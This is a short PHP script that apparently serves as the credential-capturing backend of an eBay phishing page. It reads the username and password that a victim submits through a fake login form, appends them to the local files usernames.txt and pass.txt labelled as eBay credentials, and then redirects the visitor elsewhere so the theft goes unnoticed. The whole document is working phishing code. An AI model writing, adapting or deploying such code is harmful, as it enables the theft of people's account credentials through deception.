<?php

file_put_contents("usernames.txt", "Ebay Username : " . $email = $_POST['userid'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Ebay Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: redirecturl');
?>
